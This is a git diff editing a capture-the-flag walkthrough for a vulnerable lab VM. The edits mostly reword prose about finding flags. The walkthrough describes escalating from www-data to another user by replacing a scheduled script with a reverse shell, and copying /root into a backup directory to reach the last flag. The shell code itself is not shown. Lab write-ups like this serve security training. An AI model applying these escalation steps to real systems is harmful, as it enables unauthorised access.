@@ -339,7 +339,7 @@ cd /home/alice/script
 touch test
 ```
 
-We go to ```/back/backup``` directory and found some interesting stuff there.  The ```backup``` is empty in the beginning.  We found the final flag ```FLAG3``` there.  
+We go to ```/back/backup``` directory and found some interesting stuff there.  The ```backup``` is empty in the beginning.  We found the final flag ```FLAG3``` there.  Thinking that it is the last flag.    
 
 ```bash
 www-data@broken:/back$ cd /back 
@@ -371,11 +371,11 @@ www-data@broken:/back/backup$
 
 ![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/022.png)  
 
-After seeing this note, that mean there is something to do further.  It is to try to put a directory to the ```path.txt```.  Trying to put ```/root``` to the ```path.txt```.
+After seeing this note, that mean there is something to do further.  The FLAG3 may not be the last flag.  Planning to put a directory to the ```path.txt```.  It is going to put ```/root``` to the ```path.txt```.
 
-However, we need to be ```alice``` rights to do so.  After studying the scripts, it is confirmed that ```log.py``` will run in ```alice``` rights.
+However, we need to be ```alice``` rights to do so.  However, we are at ```www-data``` rights at the moment.  After studying the scripts, it is confirmed that ```log.py``` will run in ```alice``` rights.
 
-At Kali box, create a ```log.py``` with the following content.
+At Kali box, create a ```log.py``` with the following reverse shell.
 
 ```python
 #!/usr/bin/python2.7
@@ -413,7 +413,7 @@ echo "/root" > path.txt
 
 ![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/024.png)  
 
-Then go to ```/home/alice/backup/root```.
+Then go to ```/home/alice/backup/root``` and we get the last flag.  
 
 ![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/025.png)  
 
